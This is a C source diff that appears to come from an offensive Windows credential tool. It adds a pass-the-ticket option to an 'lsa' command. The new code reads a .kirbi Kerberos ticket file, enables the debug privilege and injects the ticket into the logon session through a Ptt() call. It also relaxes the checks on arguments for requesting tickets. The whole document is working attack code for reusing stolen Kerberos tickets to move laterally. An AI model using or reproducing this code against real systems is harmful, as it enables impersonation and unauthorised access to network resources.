@@ -123,14 +123,16 @@ int cmd_lsa(int argc, char *argv[]) {
   struct arg_str *passwd;
   struct arg_str *domain;
   struct arg_str *outfile;
+  struct arg_str *infile;
   void *argtable[] = {
       help = arg_lit0(NULL, "help", "show help"),
-      spn = arg_str1(NULL, "spn", "<value>", "required spn/target service"),
+      spn = arg_str0(NULL, "spn", "<value>", "spn/target service"),
       passwd = arg_str0(NULL, "passwd", "<value>", "optional password"),
       user = arg_str0(NULL, "user", "<value>", "optional username"),
       domain = arg_str0(NULL, "domain", "<value>", "optional domain"),
-      outfile = arg_str1(NULL, "outfile", "<value>",
-                         "output file for ticket (required)"),
+      outfile = arg_str0(NULL, "outfile", "<value>", "output file for ticket"),
+      infile =
+          arg_str0(NULL, "input", "<value>", "input file for pass the ticket."),
       end = arg_end(20),
   };
   int narg = sizeof(argtable) / sizeof(argtable[0]);
@@ -157,7 +159,8 @@ int cmd_lsa(int argc, char *argv[]) {
     return 1;
   }
   PCredHandle credH = NULL;
-  if (user->count > 0 && passwd->count > 0 && domain->count > 0) {
+  if (user->count > 0 && passwd->count > 0 && domain->count > 0 &&
+      spn->count > 0 && outfile->count > 0) {
     EnablePrivilege("debug");
     ImpersonateSystem();
     // PBYTE ticketOut;
@@ -168,7 +171,33 @@ int cmd_lsa(int argc, char *argv[]) {
     // printf("ticket length: %llu\n", sizeof(ticketOut));
     return 0;
   }
-  if (spn->count == 0) {
+  if (infile->count > 0) {
+    EnablePrivilege("debug");
+    // ImpersonateSystem();
+    HANDLE hFile = CreateFile(infile->sval[0], GENERIC_READ,
+                              FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+                              OPEN_EXISTING, 0, NULL);
+    PBYTE data;
+    DWORD dwBytesReaded;
+    LARGE_INTEGER filesize;
+    DWORD length;
+    if (hFile == ERROR_FILE_HANDLE_REVOKED || hFile == NULL) {
+      printf("Cannot open kirbi file: 0x%lx\n", GetLastError());
+      return -1;
+    }
+    printf("reading file..\n");
+    GetFileSizeEx(hFile, &filesize);
+    length = filesize.LowPart;
+    data = (PBYTE)LocalAlloc(LPTR, length);
+    ReadFile(hFile, data, length, &dwBytesReaded, NULL);
+    CloseHandle(hFile);
+    printf("read file..\n");
+    NTSTATUS status = Ptt(data, length);
+    printf("pass the ticket status: 0x%lx\n", status);
+    return 0;
+  }
+
+  if (spn->count == 0 && infile->count == 0) {
     goto help_goto;
   }
 
